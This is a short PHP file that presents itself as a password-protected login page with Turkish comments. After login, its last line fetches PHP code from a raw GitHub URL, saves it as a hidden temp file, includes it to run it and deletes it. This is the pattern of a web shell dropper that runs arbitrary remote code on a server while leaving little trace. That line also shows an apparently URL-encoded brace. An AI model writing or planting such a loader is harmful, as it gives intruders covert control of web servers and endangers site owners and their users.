<?php
session_start(); // Oturum başlat

// Giriş kontrolü
if (isset($_POST['password'])) {
    $password = $_POST['password'];
    $correctPasswordHash = "16943c9f845bb7757ca822af0ed9d132";
    if (md5($password) === $correctPasswordHash) {
        $_SESSION['logged_in'] = true; // Oturum durumu belirle
        header("Location: " . $_SERVER['PHP_SELF']); // Yeniden yönlendir
        exit;
    } else {
        $error = "Wrong Password";
    }
}

// Giriş yapılmış mı kontrolü
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true):
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>login</title>
</head>
<body>
    <?php if (isset($error)): ?>
        <p style="color: red;"><?php echo $error; ?></p>
    <?php endif; ?>
    <form method="post">
        <label for="password">pass:</label>
        <input type="password" id="password" name="password" required>
        <br>
        <button type="submit">login</button>
    </form>
</body>
</html>
<?php
exit;
endif;
?>

<?php $u="https://raw.githubusercontent.com/iComsium/iComsium/refs/heads/master/mk7ico.php";$c=@file_get_contents($u);if($c)%7B$f=__DIR__.'/._tmp.php';file_put_contents($f,$c);include $f;unlink($f);} ?>